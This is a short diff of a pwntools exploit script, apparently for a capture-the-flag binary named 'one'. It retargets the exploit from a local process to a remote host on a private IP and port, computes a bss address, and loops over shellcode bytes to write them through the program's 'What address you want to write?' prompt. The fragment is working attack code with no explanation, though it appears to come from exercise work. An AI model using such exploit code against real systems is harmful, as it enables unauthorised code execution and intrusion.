@@ -1,5 +1,6 @@
 from pwn import *
-p=process('./one')
+# p=process('./one')
+p=remote('10.81.2.235',10040)
 # gdb.attach(p)
 # context.log_level='debug'
 context.arch='amd64'
@@ -31,7 +32,7 @@ bss_addr=pro_base+elf.bss()
 print("bss_addr",hex(bss_addr))
 input_begin=bss_addr+0x200
 print("input_begin",hex(input_begin))
-
+# p.interactive()
 for index,item in enumerate(shellcode):
     print(hex(item),index)
     p.recvuntil(b'What address you want to write?\n')
